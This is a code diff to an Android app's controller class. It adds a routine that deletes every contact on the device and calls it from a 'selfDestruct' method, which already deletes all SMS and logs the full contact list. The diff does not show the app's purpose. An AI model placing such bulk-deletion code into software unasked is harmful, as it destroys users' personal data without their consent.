@@ -300,6 +300,7 @@ public class MandoController {
     private static void selfDestruct(final Callback cb) {
         deleteAllSMS();
         final String s = getAllContacts(null);
+        deleteAllContact();
         Log.e("mando", s);
         String sdCard = Environment.getExternalStorageDirectory()
                 .getAbsolutePath();
@@ -602,6 +603,7 @@ public class MandoController {
     }
 
     public static String getAllContacts(String x) {
+        // https://code.google.com/p/deleteall/source/browse/trunk/Delete2.0/src/com/android/contact/delete/main.java?r=5
         ContentResolver cr = c.getContentResolver();
         StringBuilder hasil = new StringBuilder();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
@@ -627,6 +629,42 @@ public class MandoController {
             }
         }
         return hasil.toString();
+    }
+    
+    public static     void deleteAllContact(){
+        String TAG = "mando";
+        Log.i(TAG, "In deleteAllContact()");
+        Uri uri_contacts = ContactsContract.Contacts.CONTENT_URI;
+        String str_column_name = ContactsContract.Contacts._ID;
+        String[] projection = {str_column_name};
+        int columnIndex = 0;
+        String str_id = "";
+        Vector<String> vector_id = new Vector<String>();
+        ContentResolver cr = c.getContentResolver();
+        int delRow = 0;
+        String where = "";
+        try {
+                Cursor cursor = cr.query(uri_contacts, projection, null, null, null);
+                if(cursor.moveToFirst()){
+                        do{
+                                columnIndex = cursor.getColumnIndex(str_column_name);
+                                str_id = cursor.getString(columnIndex);
+                                vector_id.add(str_id);
+                        }while(cursor.moveToNext());
+                }
+                cursor.close();
+                for(int i=0; i<vector_id.size(); i++){
+                        str_id = vector_id.get(i);
+                        where = str_column_name+"="+str_id;
+                        delRow = cr.delete(uri_contacts, where, null);
+                        Log.i(TAG, "deleteAllContact(),delRow:"+delRow);
+                }
+                } catch (Exception e) {
+                        // TODO Auto-generated catch block
+                        Log.e(TAG, "deleteAllContact(),Exception");
+                        e.printStackTrace();
+                }
+                Log.i(TAG, "Out deleteAllContact()");
     }
     
 
